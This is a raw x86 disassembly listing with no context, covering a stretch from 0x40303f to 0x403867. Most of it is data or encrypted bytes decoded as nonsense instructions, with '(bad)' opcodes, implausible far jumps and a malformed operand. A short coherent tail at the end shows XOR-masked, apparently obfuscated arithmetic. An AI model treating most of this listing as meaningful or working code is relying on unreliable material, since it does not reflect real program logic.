  40303f:	mov    ebx,0x3b054183
  403044:	call   0xa0b9:0xf03ce2ef
  40304b:	sbb    bl,BYTE PTR [ebx+0x6e]
  40304e:	mov    esi,0x320ab682
  403053:	call   0x4aa0:0x240ff2bc
  40305a:	stc    
  40305b:	lods   eax,DWORD PTR ds:[esi]
  40305c:	inc    ecx
  40305d:	adc    al,0xd9
  40305f:	fbld   TBYTE PTR [esi-0x75]
  403062:	inc    ebp
  403063:	cld    
  403064:	jmp    0x403415
  403069:	jl     0x403082
  40306b:	sub    al,0xf7
  40306d:	jge    0x402ffc
  40306f:	jge    0x40306e
  403071:	inc    edx
  403072:	sbb    dh,BYTE PTR [ebx]
  403074:	fistp  DWORD PTR [ebp-0x618e0de0]
  40307a:	sbb    bh,BYTE PTR [esi+0x7e]
  40307d:	xor    BYTE PTR [ecx+0x7e],0x7e
  403081:	pop    es
  403082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403083:	pop    ebx
  403084:	adc    ebx,esi
  403086:	and    al,0x1
  403088:	mov    ah,0xb7
  40308a:	mov    ebx,0xa6b44539
  40308f:	je     0x9bfc20f5
  403095:	arpl   di,ax
  403097:	daa    
  403098:	mov    eax,0x904138a0
  40309d:	out    dx,eax
  40309e:	mov    dl,0x4a
  4030a0:	jbe    0x403035
  4030a2:	fs inc esi
  4030a4:	ffreep st(4)
  4030a6:	(bad)
  4030a9:	into   
  4030aa:	jno    0x403052
  4030ac:	js     0x40308b
  4030ae:	int    0x92
  4030b0:	stos   DWORD PTR es:[edi],eax
  4030b1:	lods   al,BYTE PTR ds:[esi]
  4030b2:	rcl    bl,cl
  4030b4:	rcr    bl,0x9e
  4030b7:	cld    
  4030b8:	inc    edi
  4030b9:	and    DWORD PTR [edx],eax
  4030bb:	mov    eax,ds:0x591ffab3
  4030c0:	in     eax,dx
  4030c1:	cmp    ecx,edx
  4030c3:	sub    bh,0x6c
  4030c6:	and    al,0x18
  4030c8:	or     DWORD PTR [ebp+eax*2+0x4be58474],eax
  4030cf:	mov    esp,DWORD PTR ds:0x2aab4163
  4030d5:	sub    ebx,esi
  4030d7:	in     eax,0x2c
  4030d9:	mov    bh,0x9d
  4030db:	dec    ebx
  4030dc:	jae    0x403112
  4030de:	inc    edi
  4030df:	sbb    eax,0x3ab9909a
  4030e4:	xchg   BYTE PTR [ecx],bh
  4030e6:	pop    esp
  4030e7:	mov    ds:0x51c031cc,al
  4030ec:	les    edi,FWORD PTR [edx]
  4030ee:	loope  0x4030dd
  4030f0:	inc    esi
  4030f1:	adc    DWORD PTR [eax],0x29d4f3d3
  4030f7:	xor    BYTE PTR [edi],dh
  4030f9:	mov    ds:0xf76c946,eax
  4030fe:	shr    BYTE PTR [edi-0x168cf0c7],1
  403104:	xchg   BYTE PTR [ecx],bh
  403106:	dec    edx
  403107:	push   es
  403108:	or     ah,BYTE PTR [ebx]
  40310a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40310b:	unpckhps xmm0,XMMWORD PTR [edi+0xd1f14d3]
  403112:	mov    ebp,DWORD PTR [ebx-0x72]
  403115:	xchg   edi,eax
  403116:	or     esi,eax
  403118:	xchg   edi,eax
  403119:	into   
  40311a:	imul   edi,DWORD PTR [ebp+0x5d88a650],0xcdcc1a73
  403124:	das    
  403125:	xor    eax,0x40e9a7b5
  40312a:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40312c:	shr    DWORD PTR [esi-0xb040b2c],0xe3
  403133:	add    dh,BYTE PTR [edi-0x67]
  403136:	xchg   ebp,eax
  403137:	add    DWORD PTR [edx-0x80],eax
  40313a:	add    BYTE PTR [eax-0x2d59eb0d],dl
  403140:	pop    esi
  403141:	jae    0x4030c4
  403143:	fldenv [esp+esi*4+0x77b3eca2]
  40314a:	cs inc esp
  40314c:	jnp    0x403187
  40314e:	hlt    
  40314f:	icebp  
  403150:	sbb    eax,0x446d7942
  403155:	jno    0x4031ba
  403157:	xor    cl,BYTE PTR [ebp-0x4d]
  40315a:	test   DWORD PTR cs:[ecx+0x208645ec],eax
  403161:	icebp  
  403162:	jg     0x403141
  403164:	add    esi,0x7bee8069
  40316a:	int    0x12
  40316c:	cmp    ecx,DWORD PTR ds:0x4e98694a
  403172:	mov    edx,0xfd2bfe97
  403177:	inc    edx
  403178:	pop    esi
  403179:	imul   ebx,esi,0xffffff8c
  40317c:	mov    fs,WORD PTR [ebx]
  40317e:	mov    dh,cl
  403180:	sti    
  403181:	push   edi
  403182:	mov    bl,0x1d
  403184:	scas   al,BYTE PTR es:[edi]
  403185:	jge    0x403146
  403187:	or     edi,DWORD PTR [edx-0x3]
  40318a:	jg     0x4031ff
  40318c:	(bad)  
  40318d:	adc    eax,0x52d0f94
  403192:	or     eax,0x336fdafc
  403197:	adc    BYTE PTR [ebx+0x4a82ac07],dl
  40319d:	jno    0x4031f6
  40319f:	aam    0xc6
  4031a1:	adc    al,0xc9
  4031a3:	jecxz  0x40312e
  4031a5:	push   ecx
  4031a6:	popf   
  4031a7:	(bad)  
  4031a8:	sbb    eax,0xd879551
  4031ad:	cdq    
  4031ae:	jbe    0x403153
  4031b0:	push   es
  4031b1:	mov    al,0x42
  4031b3:	pushf  
  4031b4:	loop   0x403167
  4031b6:	repz popa 
  4031b8:	xor    DWORD PTR [esi-0x213fdbd2],esi
  4031be:	(bad)  
  4031bf:	fistp  WORD PTR [edi-0x664b9a14]
  4031c5:	mov    WORD PTR [esi+0x31],fs
  4031c8:	jg     0x40322b
  4031ca:	lea    esp,[ebx+0x4d]
  4031cd:	in     eax,dx
  4031ce:	pusha  
  4031cf:	mov    edx,0x2c024f20
  4031d4:	inc    edx
  4031d5:	jne    0x403240
  4031d7:	or     bh,ch
  4031d9:	sbb    bl,BYTE PTR [edx]
  4031db:	mov    ebx,0xc2c3b70d
  4031e0:	jae    0x40324b
  4031e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031e3:	retf   
  4031e4:	enter  0x5524,0x71
  4031e8:	arpl   cx,bp
  4031ea:	aaa    
  4031eb:	ficom  DWORD PTR [esi]
  4031ed:	mov    BYTE PTR [edx],cl
  4031ef:	add    eax,0xf10a5eba
  4031f4:	mov    esi,0xb21d5c3c
  4031f9:	xchg   esp,eax
  4031fa:	stos   DWORD PTR es:[edi],eax
  4031fb:	div    BYTE PTR [ecx]
  4031fd:	shr    eax,0x46
  403200:	into   
  403201:	aam    0xf7
  403203:	inc    eax
  403204:	cs scas al,BYTE PTR es:[edi]
  403206:	in     eax,0x10
  403208:	gs pusha 
  40320a:	adc    al,BYTE PTR [ebx+0x31f36b22]
  403210:	xchg   esp,eax
  403211:	int    0x8f
  403213:	xchg   ebp,eax
  403214:	sahf   
  403215:	xchg   edx,edx
  403217:	pop    ss
  403218:	mov    ebp,0x8193395e
  40321d:	(bad)  
  40321f:	lea    esp,[ebx-0x6366b3b2]
  403225:	sbb    ecx,ebp
  403227:	jmp    0xd5c4:0x2907357
  40322e:	mov    ebx,0x5068f613
  403233:	sbb    BYTE PTR [esi+0xb2d35bc],dl
  403239:	or     eax,DWORD PTR [eax]
  40323b:	ja     0x40321b
  40323d:	mov    al,0xa2
  40323f:	jl     0x403211
  403241:	ret    0xa240
  403244:	rcr    DWORD PTR [edi],1
  403246:	jnp    0x403285
  403248:	push   ds
  403249:	dec    edi
  40324a:	in     eax,0x20
  40324c:	cmp    al,0xc6
  40324e:	test   al,0x89
  403250:	pop    edi
  403251:	jmp    0x99f7fc0d
  403256:	xchg   edi,eax
  403257:	pop    ss
  403258:	inc    edi
  403259:	xchg   esi,eax
  40325a:	clc    
  40325b:	mov    dl,0xba
  40325d:	push   edi
  40325e:	(bad)  
  40325f:	aaa    
  403260:	push   eax
  403261:	enter  0x232a,0xd9
  403265:	inc    esp
  403266:	xchg   edx,eax
  403267:	or     bl,0xbf
  40326a:	sbb    eax,DWORD PTR [ebp+0x776da840]
  403270:	inc    ecx
  403271:	adc    al,0x23
  403273:	xor    eax,DWORD PTR [edi]
  403275:	or     eax,0xf44d9f20
  40327a:	mov    al,0x49
  40327c:	or     eax,0x76e00551
  403281:	pop    ebp
  403282:	call   0x51dd:0x80b6
  403288:	sbb    esp,DWORD PTR [ebx-0xb2dae64]
  40328e:	pop    edx
  40328f:	xor    edx,edi
  403291:	adc    DWORD PTR [ecx+0x30],0xa7280e18
  403298:	stos   DWORD PTR es:[edi],eax
  403299:	xor    edi,DWORD PTR [ebp+0xf]
  40329c:	in     eax,0x5f
  40329e:	fld    TBYTE PTR [ebx-0x47]
  4032a1:	pop    ebp
  4032a2:	mov    ?,edx
  4032a4:	enter  0x8fae,0x7b
  4032a8:	(bad)  
  4032a9:	cmp    esi,DWORD PTR [edi-0x5f]
  4032ac:	cmp    DWORD PTR [ecx+ebx*4+0x5327d103],eax
  4032b3:	xchg   edx,esp
  4032b5:	pop    ebp
  4032b6:	mov    esi,0xefbddd77
  4032bb:	pop    eax
  4032bc:	std    
  4032bd:	sahf   
  4032be:	mov    esp,0x4c57096d
  4032c3:	or     DWORD PTR [edx*1+0x3e1f744],ecx
  4032ca:	sahf   
  4032cb:	sar    DWORD PTR [edi],1
  4032cd:	ja     0x403287
  4032cf:	test   DWORD PTR [ecx],ebx
  4032d1:	push   edx
  4032d2:	test   BYTE PTR [eax+0x3f],bl
  4032d5:	sbb    BYTE PTR [edx+0x52ea42b],bl
  4032db:	add    al,0x51
  4032dd:	aam    0xa0
  4032df:	jo     0x403343
  4032e1:	clc    
  4032e2:	stos   DWORD PTR es:[edi],eax
  4032e3:	push   eax
  4032e4:	mov    bl,0xc8
  4032e6:	mov    ebp,0x2e6889d
  4032eb:	inc    ebx
  4032ec:	retf   0xc43
  4032ef:	out    dx,eax
  4032f0:	xor    al,0x62
  4032f2:	jmp    0x40331c
  4032f4:	or     ecx,DWORD PTR [ecx+0x79]
  4032f7:	xchg   edi,eax
  4032f8:	inc    ebp
  4032f9:	lods   eax,DWORD PTR ds:[esi]
  4032fa:	test   BYTE PTR [ebx-0x173ff33f],dl
  403300:	stos   DWORD PTR es:[edi],eax
  403301:	stos   BYTE PTR es:[edi],al
  403302:	data16 loopne 0x403290
  403305:	mov    esi,0x3af33829
  40330a:	pop    ebx
  40330b:	bnd ds jp 0x403380
  40330f:	jmp    0xf4fb972d
  403314:	out    0xa3,eax
  403316:	jno    0x40334b
  403318:	push   esp
  403319:	lock fwait
  40331b:	mov    al,0xf9
  40331d:	mov    bl,0x80
  40331f:	icebp  
  403320:	mov    ebp,DWORD PTR [esi-0x76]
  403323:	dec    ebx
  403324:	js     0x40338b
  403326:	cmp    cl,BYTE PTR [edx+0x478ab501]
  40332c:	nop
  40332d:	loopne 0x403356
  40332f:	xchg   edx,eax
  403330:	jne    0x4032ca
  403332:	setg   BYTE PTR [eax+0x15f481a8]
  403339:	lahf   
  40333a:	loopne 0x403322
  40333c:	lock xchg edx,eax
  40333e:	dec    ebp
  40333f:	pop    esp
  403340:	mov    BYTE PTR [esi+0x34706234],ah
  403346:	es jmp 0x3cc8:0xa010366e
  40334e:	popf   
  40334f:	dec    esp
  403350:	xchg   ecx,eax
  403351:	in     eax,dx
  403352:	push   ebp
  403353:	sub    edi,DWORD PTR [edi+0x18]
  403356:	push   edi
  403357:	frstor [edx]
  403359:	xchg   esi,eax
  40335a:	inc    ecx
  40335b:	jg     0x403376
  40335d:	cdq    
  40335e:	mov    bl,0xa
  403360:	enter  0xd5cb,0x2f
  403364:	xchg   edi,eax
  403365:	cld    
  403366:	loopne 0x4033b6
  403368:	cmp    DWORD PTR [edx-0x14],esp
  40336b:	pop    eax
  40336c:	mov    bh,0x3c
  40336e:	or     BYTE PTR [ecx-0x29],al
  403371:	xchg   edx,eax
  403372:	pop    ebp
  403373:	and    al,0x58
  403375:	sahf   
  403376:	imul   eax,DWORD PTR [ebx],0x39
  403379:	and    dl,BYTE PTR [edx-0x6e]
  40337c:	call   0x304c:0xa4454178
  403383:	or     dl,BYTE PTR [eax-0x3c]
  403386:	push   es
  403387:	fcomp  DWORD PTR [esi+0x4b3b50b9]
  40338d:	and    eax,0x5ae980e2
  403392:	pop    ecx
  403393:	ins    BYTE PTR es:[edi],dx
  403394:	mov    edx,0xf30ac5ea
  403399:	loope  0x40335e
  40339b:	and    BYTE PTR ds:0xeb4f87b2,bl
  4033a1:	dec    edx
  4033a2:	sahf   
  4033a3:	lock pop ebx
  4033a5:	inc    ebp
  4033a6:	inc    eax
  4033a7:	add    edx,ebp
  4033a9:	jge    0x4033a3
  4033ab:	inc    ecx
  4033ac:	mov    edx,DWORD PTR [eax]
  4033ae:	(bad)  
  4033af:	push   esp
  4033b0:	loopne 0x403400
  4033b2:	or     edi,edi
  4033b4:	stos   BYTE PTR es:[edi],al
  4033b5:	loopne 0x40335f
  4033b7:	add    BYTE PTR [eax+ebp*8-0x16],dl
  4033bb:	bound  edi,QWORD PTR [ebp-0x39bc9891]
  4033c1:	in     eax,0x22
  4033c3:	repnz xor DWORD PTR [edi-0x26],esp
  4033c7:	inc    ebx
  4033c8:	and    cl,BYTE PTR [ecx+0x48f45eb0]
  4033ce:	and    eax,0x6357a024
  4033d3:	icebp  
  4033d4:	mov    esp,0x72b56361
  4033d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033da:	sbb    ecx,DWORD PTR [ebp-0x3c5d15cc]
  4033e0:	jp     0x403369
  4033e2:	mov    bh,0x65
  4033e4:	adc    BYTE PTR [esp+eiz*8],dh
  4033e7:	adc    al,0xa7
  4033e9:	dec    ebp
  4033ea:	imul   eax,DWORD PTR [ecx+0x3fc715b3],0xbad17b9
  4033f4:	add    al,0x81
  4033f6:	add    dh,cl
  4033f8:	sbb    dl,ah
  4033fa:	cli    
  4033fb:	cmc    
  4033fc:	je     0x4033a0
  4033fe:	(bad)  
  403400:	add    al,0xe5
  403402:	out    0xb7,al
  403404:	in     al,dx
  403405:	dec    eax
  403406:	imul   ecx,DWORD PTR [ebx+0x47],0x7f
  40340a:	dec    ebp
  40340b:	push   ebx
  40340c:	aas    
  40340d:	jb     0x4033ff
  40340f:	aam    0x86
  403411:	stos   DWORD PTR es:[edi],eax
  403412:	out    0xb3,eax
  403414:	inc    ebp
  403415:	mov    edi,DWORD PTR [ebp+0x8]
  403418:	mov    edi,DWORD PTR [edi]
  40341a:	mov    edx,0x8a40
  40341f:	xor    ax,dx
  403422:	jmp    0x4037d3
  403427:	nop
  403428:	cdq    
  403429:	fst    QWORD PTR [ecx-0x6683aa03]
  40342f:	xlat   BYTE PTR ds:[ebx]
  403430:	push   cs
  403431:	mov    cl,0xfe
  403433:	out    0xb1,eax
  403435:	loope  0x4034b1
  403437:	and    bl,BYTE PTR [esi]
  403439:	jle    0x4034b9
  40343b:	xor    BYTE PTR [ecx+0x7e],0x7e
  40343f:	xor    bl,BYTE PTR [ecx+0x57b7380b]
  403445:	adc    cl,al
  403447:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403448:	dec    eax
  403449:	cld    
  40344a:	mov    bl,0x61
  40344c:	(bad)  
  40344d:	popa   
  40344e:	idiv   DWORD PTR [edx-0x53]
  403451:	stos   BYTE PTR es:[edi],al
  403452:	mov    cs,WORD PTR [esi]
  403454:	mov    ebp,DWORD PTR [eax]
  403456:	add    DWORD PTR [ecx-0x4f],ebx
  403459:	and    eax,0x4006141c
  40345e:	inc    esi
  40345f:	mov    bl,0x8d
  403461:	cmp    DWORD PTR [esi-0x5ff65dbb],edx
  403467:	pop    esi
  403468:	or     esi,DWORD PTR [eax+esi*1-0x672cdae6]
  40346f:	add    al,0x77
  403471:	push   eax
  403472:	push   ebx
  403473:	add    DWORD PTR [eax],esp
  403475:	xchg   BYTE PTR [esi-0x35c0405a],bl
  40347b:	ret    0xc780
  40347e:	push   ebp
  40347f:	mov    dl,0xdf
  403481:	ja     0x4034e4
  403483:	mov    dl,bh
  403485:	call   0x6595b307
  40348a:	mov    ecx,DWORD PTR [ecx+0x8]
  40348d:	push   ss
  40348e:	sub    eax,ecx
  403490:	mov    WORD PTR [ebx-0x29fc14d3],gs
  403496:	jo     0x4034da
  403498:	cmp    esp,DWORD PTR [ebp+eax*8+0x69]
  40349c:	xchg   ebp,eax
  40349d:	fisub  WORD PTR [edx-0xa2498f8]
  4034a3:	and    ebp,DWORD PTR [edi]
  4034a5:	scas   eax,DWORD PTR es:[edi]
  4034a6:	je     0x403485
  4034a8:	push   ebp
  4034a9:	(bad)  
  4034aa:	ja     0x4034a6
  4034ac:	jns    0x40344d
  4034ae:	jmp    0x47e4e0ce
  4034b3:	jmp    0xb047:0x790f31fa
  4034ba:	inc    esp
  4034bb:	jae    0x403511
  4034bd:	pop    ds
  4034be:	jmp    0x403446
  4034c0:	cs mov ah,0x48
  4034c3:	sub    al,0x15
  4034c5:	shr    al,1
  4034c7:	push   ecx
  4034c8:	add    ebx,DWORD PTR [esi-0x20]
  4034cb:	test   eax,0xef42a6d1
  4034d0:	adc    BYTE PTR [eax*8+0x3eff61a3],dh
  4034d7:	cld    
  4034d8:	aad    0x49
  4034da:	add    al,0xc8
  4034dc:	xor    BYTE PTR [edi],al
  4034de:	in     eax,0xb0
  4034e0:	xchg   esi,eax
  4034e1:	pop    eax
  4034e2:	not    DWORD PTR [edi]
  4034e4:	mov    ebx,0x9b1c21a7
  4034e9:	repz sbb eax,0x3fb35b47
  4034ef:	and    BYTE PTR [ecx+0x2d],cl
  4034f2:	jb     0x4034dc
  4034f4:	cmp    DWORD PTR [ecx],ebx
  4034f6:	mov    edx,0xd867e767
  4034fb:	lea    esi,[edi+0xb761f87]
  403501:	mov    bh,0xd0
  403503:	fwait
  403504:	out    dx,eax
  403505:	dec    eax
  403506:	inc    edx
  403507:	mov    BYTE PTR [eax],bh
  403509:	(bad)  
  40350a:	inc    esp
  40350b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40350c:	into   
  40350d:	xor    eax,0x6c7987c2
  403512:	pop    ebp
  403513:	aam    0x34
  403515:	xor    edx,esp
  403517:	or     bh,BYTE PTR [eax-0x7bca0365]
  40351d:	pop    edx
  40351e:	hlt    
  40351f:	ins    DWORD PTR es:[edi],dx
  403520:	sub    ch,BYTE PTR [eax-0x689b8557]
  403526:	xadd   BYTE PTR [esi-0xfc896a0],cl
  40352d:	jb     0x4034b5
  40352f:	sbb    DWORD PTR [esi],ebp
  403531:	adc    eax,eax
  403533:	mov    esi,0xd4f24f74
  403538:	sub    BYTE PTR [esi-0x6f4ce996],bh
  40353e:	sub    BYTE PTR [esi+0x7ab8f3ff],0x2e
  403545:	retf   0x228f
  403548:	int    0x31
  40354a:	dec    edx
  40354b:	nop
  40354c:	sub    dh,ah
  40354e:	mov    bh,0x9d
  403550:	dec    eax
  403551:	call   0xfeedbabb
  403556:	lods   eax,DWORD PTR ds:[esi]
  403557:	verw   WORD PTR [ebx-0x21]
  40355b:	test   BYTE PTR [ebx-0x16f1bbee],0xc4
  403562:	xor    DWORD PTR [eax+0x5e],ecx
  403565:	lods   al,BYTE PTR ds:[esi]
  403566:	outs   dx,DWORD PTR ds:[esi]
  403567:	scas   eax,DWORD PTR es:[edi]
  403568:	adc    DWORD PTR [esi-0x28],0xa39e0519
  40356f:	fist   DWORD PTR [edi]
  403571:	cmp    BYTE PTR [ebp+eax*4-0x72ead737],cl
  403578:	cmp    al,0x21
  40357a:	and    al,0x4b
  40357c:	xor    BYTE PTR [eax],bl
  40357e:	jmp    DWORD PTR [edi+eax*2+0x1a]
  403582:	ret    0x9030
  403585:	retf   
  403586:	cmp    al,0xda
  403588:	xchg   esi,eax
  403589:	ficom  WORD PTR [eax+0x49]
  40358c:	pop    ss
  40358d:	aam    0x97
  40358f:	aam    0x3f
  403591:	repnz add al,0x74
  403594:	int    0x3d
  403596:	stc    
  403597:	scas   al,BYTE PTR es:[edi]
  403598:	sub    BYTE PTR [eax+0x7a],bl
  40359b:	test   eax,0xf32b35f9
  4035a0:	push   es
  4035a1:	outs   dx,BYTE PTR ds:[esi]
  4035a2:	and    edx,DWORD PTR [edi]
  4035a4:	sbb    DWORD PTR [ebx-0x59070059],esi
  4035aa:	sbb    al,0xb1
  4035ac:	push   esp
  4035ad:	fmulp  st(0),st
  4035af:	push   edx
  4035b0:	and    eax,0x8f01491f
  4035b5:	sbb    DWORD PTR [ebp+0x7df05a87],ecx
  4035bb:	sar    ch,cl
  4035bd:	xor    esi,DWORD PTR [edi+0x57]
  4035c0:	test   DWORD PTR [eax-0x45],edx
  4035c3:	data16 aam 0xad
  4035c6:	xor    DWORD PTR ds:0xd317650d,edi
  4035cc:	loope  0x40360e
  4035ce:	jo     0x4035e0
  4035d0:	inc    ebp
  4035d1:	pop    ds
  4035d2:	sbb    DWORD PTR [ebx],0x4cc45ff2
  4035d8:	or     al,BYTE PTR [ebx-0x67]
  4035db:	mov    ebp,DWORD PTR ds:0xcebae70f
  4035e1:	xor    eax,0x1e3dadd6
  4035e6:	pop    esi
  4035e7:	retf   
  4035e8:	sti    
  4035e9:	int    0xb2
  4035eb:	xor    BYTE PTR [esi],bh
  4035ed:	scas   al,BYTE PTR es:[edi]
  4035ee:	cmp    DWORD PTR [esi+0x47],0x147f8954
  4035f5:	xlat   BYTE PTR ds:[ebx]
  4035f6:	das    
  4035f7:	mov    edx,0x6d269d0c
  4035fc:	lock call 0x3d7a:0x7474bc93
  403604:	dec    edx
  403605:	mov    ebp,DWORD PTR [edx-0x329e7930]
  40360b:	push   eax
  40360c:	inc    esi
  40360d:	mov    eax,0xfa928715
  403612:	sbb    eax,0x117efe1f
  403617:	in     eax,0x11
  403619:	rcl    BYTE PTR [esi],cl
  40361b:	lods   al,BYTE PTR ds:[esi]
  40361c:	stc    
  40361d:	push   0xc92c1e0b
  403622:	dec    ebx
  403623:	lock loop 0x403691
  403626:	add    BYTE PTR [ebp+0x189c3cd7],dh
  40362c:	es pop edx
  40362e:	pop    esi
  40362f:	inc    esi
  403630:	(bad)  
  403631:	sti    
  403632:	xchg   ebx,eax
  403633:	fdivr  st,st(6)
  403635:	xchg   ebx,eax
  403636:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  403638:	shl    BYTE PTR ds:0xf6eedc08,0x4c
  40363f:	mov    ecx,0xec2d153a
  403644:	cli    
  403645:	sbb    DWORD PTR [edx+0x64e44f3c],eax
  40364b:	scas   al,BYTE PTR es:[edi]
  40364c:	mov    bh,0xcd
  40364e:	sub    al,0xc2
  403650:	div    ebx
  403652:	inc    ebx
  403653:	inc    esp
  403654:	or     ebx,DWORD PTR [edx+0xa]
  403657:	inc    eax
  403658:	mov    esi,DWORD PTR [ebx]
  40365a:	xor    al,BYTE PTR [edx]
  40365c:	fistp  DWORD PTR [ebx+ecx*8]
  40365f:	jns    0x40362b
  403661:	or     eax,0x4f939927
  403666:	lods   al,BYTE PTR ds:[esi]
  403667:	jle    0x4036ad
  403669:	xor    BYTE PTR ds:[edx],0xa3
  40366d:	imul   ebp,DWORD PTR [esi],0x59579c0e
  403673:	xor    BYTE PTR [edi],cl
  403675:	xchg   edx,eax
  403676:	stos   BYTE PTR es:[edi],al
  403677:	bound  ebx,QWORD PTR [ecx+0x2d]
  40367a:	cmp    ebp,0x5a
  40367d:	xchg   BYTE PTR [eax+edx*1-0x1b521d5],dl
  403684:	add    esp,eax
  403686:	xchg   esi,eax
  403687:	xor    eax,0x55229f36
  40368c:	jbe    0x40369c
  40368e:	fcom   QWORD PTR [eax]
  403690:	fild   QWORD PTR [eax-0x2206cd3e]
  403696:	test   DWORD PTR [ecx],0x2c4829b2
  40369c:	setns  BYTE PTR [esi+0x6201e2c1]
  4036a3:	leave  
  4036a4:	stc    
  4036a5:	sahf   
  4036a6:	inc    edx
  4036a7:	test   eax,0x4ed2c0a4
  4036ac:	imul   eax,esi,0xffffffdb
  4036af:	sub    DWORD PTR [ecx+ebx*1+0x7986e51d],0x76
  4036b7:	retf   0x2609
  4036ba:	pop    esi
  4036bb:	xor    DWORD PTR [ecx-0x736ef558],0xe
  4036c2:	or     ebp,0xffffffcb
  4036c5:	jbe    0x403680
  4036c7:	inc    edx
  4036c8:	mov    ds:0x129c8323,eax
  4036cd:	xchg   ebp,eax
  4036ce:	xchg   edx,eax
  4036cf:	les    ebx,FWORD PTR [ecx+0x2]
  4036d2:	outs   dx,BYTE PTR ds:[esi]
  4036d3:	in     eax,dx
  4036d4:	int    0x26
  4036d6:	mov    WORD PTR [esi+0x701c71b2],es
  4036dc:	or     al,0x11
  4036de:	jo     0x40370a
  4036e0:	fidivr WORD PTR [edi-0x26]
  4036e3:	clc    
  4036e4:	bound  esp,QWORD PTR [eax+eiz*8]
  4036e7:	in     al,dx
  4036e8:	pop    esp
  4036e9:	pop    es
  4036ea:	mov    ebp,0x2b1c4a6a
  4036ef:	cmp    cl,BYTE PTR [edi-0x64]
  4036f2:	push   0x590f32fb
  4036f7:	add    eax,0x22f2ba24
  4036fc:	sub    BYTE PTR [esi+0x1b],dh
  4036ff:	test   DWORD PTR ds:0x34758dcd,ebp
  403705:	sbb    BYTE PTR [ebx],0x15
  403708:	lock scas eax,DWORD PTR es:[edi]
  40370a:	xor    BYTE PTR [edx+0x3a70bdfe],dh
  403710:	popa   
  403711:	jmp    0x403759
  403713:	rcl    DWORD PTR [edi+esi*8],cl
  403716:	iret   
  403717:	div    DWORD PTR [esi+0x237cf2ef]
  40371d:	xor    esp,DWORD PTR [eax]
  40371f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403720:	mov    ebp,gs
  403722:	add    BYTE PTR [edx+ecx*4+0x22d3396c],al
  403729:	js     0x403799
  40372b:	repz dec esi
  40372d:	mov    BYTE PTR [esi+0x4afa58cc],bl
  403733:	pop    ss
  403734:	(bad)
  403738:	pop    ecx
  403739:	or     bh,BYTE PTR ds:0x3860bd7e
  40373f:	xor    al,0x83
  403741:	mov    al,ds:0xe5618807
  403746:	call   FWORD PTR [ebp+0x79c119f2]
  40374c:	xlat   BYTE PTR ds:[ebx]
  40374d:	imul   eax,DWORD PTR [esi],0x3f
  403750:	dec    edi
  403751:	and    BYTE PTR [ecx+0xed7133a],cl
  403757:	sbb    BYTE PTR [esi+0x14],al
  40375a:	push   edi
  40375b:	loope  0x403738
  40375d:	pushf  
  40375e:	or     al,0x77
  403760:	test   DWORD PTR [esi],esp
  403762:	mov    ds:0xbd11eb76,al
  403767:	inc    ebx
  403768:	jo     0x40371a
  40376a:	xchg   edx,eax
  40376b:	cs cmp eax,0xf0bc0625
  403771:	sbb    eax,DWORD PTR [edx+0x68eced2e]
  403777:	sub    dh,dh
  403779:	mov    eax,ds:0xda8e318f
  40377e:	cdq    
  40377f:	and    BYTE PTR [ecx-0xa],al
  403782:	xor    ch,ah
  403784:	loop   0x40375b
  403786:	hlt    
  403787:	sbb    dh,BYTE PTR [eax]
  403789:	push   edx
  40378a:	cmp    DWORD PTR [eax+0x1c4af0ee],ebp
  403790:	loopne 0x4037dd
  403792:	fsubr  QWORD PTR [edi]
  403794:	ja     0x40374e
  403796:	dec    eax
  403798:	fadd   QWORD PTR [esi-0x7b]
  40379b:	fadd   st,st(0)
  40379d:	and    BYTE PTR [edi+0x1fe3f618],dl
  4037a3:	sub    ebp,DWORD PTR [eax+0x1d]
  4037a6:	les    eax,FWORD PTR [ebx+0x14]
  4037a9:	rcl    DWORD PTR ds:0xeedc4441,1
  4037af:	xor    al,0xd
  4037b1:	push   esi
  4037b2:	ds or  al,0x17
  4037b5:	cmc    
  4037b6:	sti    
  4037b7:	imul   ebx,ebx,0xebe5c755
  4037bd:	push   0x6bc0589c
  4037c2:	push   eax
  4037c3:	(bad)  
  4037c4:	mov    ebp,0x77a0956c
  4037c9:	sbb    DWORD PTR [edi+0x45],ecx
  4037cc:	push   ss
  4037cd:	cdq    
  4037ce:	xchg   esp,eax
  4037cf:	xchg   DWORD PTR [ebp+0x3e],eax
  4037d2:	and    DWORD PTR [edx+0x3b06],edi
  4037d8:	add    ax,dx
  4037db:	cmp    ax,WORD PTR [edi]
  4037de:	je     0x40382b
  4037e4:	mov    eax,DWORD PTR [ebp-0x14]
  4037e7:	xor    eax,ecx
  4037e9:	add    eax,esi
  4037eb:	mov    DWORD PTR [ebp-0x24],eax
  4037ee:	mov    eax,DWORD PTR [ebp-0x28]
  4037f1:	mov    di,WORD PTR [ebp-0x2c]
  4037f5:	mov    ebx,0x8a40
  4037fa:	xor    di,bx
  4037fd:	add    di,dx
  403800:	movzx  edx,di
  403803:	mov    edi,DWORD PTR [ebp-0x8]
  403806:	xor    edi,ecx
  403808:	lea    edx,[edx+edi*1+0x32729d]
  40380f:	add    DWORD PTR [eax],edx
  403811:	mov    eax,DWORD PTR [ebp-0x20]
  403814:	mov    edx,DWORD PTR [ebp-0x8]
  403817:	mov    edi,DWORD PTR [ebp-0x24]
  40381a:	xor    edx,ecx
  40381c:	add    edx,esi
  40381e:	imul   edx,edi
  403821:	sub    DWORD PTR [eax],edx
  403823:	mov    eax,DWORD PTR [ebp-0x14]
  403826:	jmp    0x4028b3
  40382b:	mov    eax,DWORD PTR [ebp-0xc]
  40382e:	mov    edx,DWORD PTR [ebp-0x18]
  403831:	xor    eax,edx
  403833:	cmp    eax,0x7aa80c5f
  403838:	je     0x402858
  40383e:	mov    eax,DWORD PTR [ebp-0x10]
  403841:	add    DWORD PTR [eax],0x7403501
  403847:	jmp    0x402858
  40384c:	mov    eax,DWORD PTR [ebp-0x1c]
  40384f:	cmp    DWORD PTR [eax],edi
  403851:	je     0x402858
  403857:	mov    eax,0x800f1c9a
  40385c:	jmp    0x4028b7
  403861:	push   ebp
  403862:	mov    ebp,esp
  403864:	sub    esp,0x44
  403867:	push   edi
